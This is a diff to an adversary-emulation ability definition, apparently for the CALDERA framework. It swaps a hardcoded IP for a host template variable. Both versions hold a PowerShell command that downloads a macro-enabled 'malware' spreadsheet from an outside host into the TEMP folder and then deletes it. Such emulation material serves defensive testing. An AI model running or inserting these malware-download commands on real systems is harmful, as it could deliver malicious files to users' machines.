@@ -13,8 +13,9 @@
   executors:
   - name: psh
     platform: windows
-    command: "Invoke-WebRequest http://198.18.133.49/malware/macro.xlsm -OutFile $env:TEMP/macro.xlsm;\
-      \ \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\macro.xlsm\" -Force"
+    command: "Invoke-WebRequest http://#{caldera.host}/malware/macro.xlsm -OutFile\
+      \ $env:TEMP/macro.xlsm; \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\\
+      macro.xlsm\" -Force"
     code: null
     language: null
     build_target: null
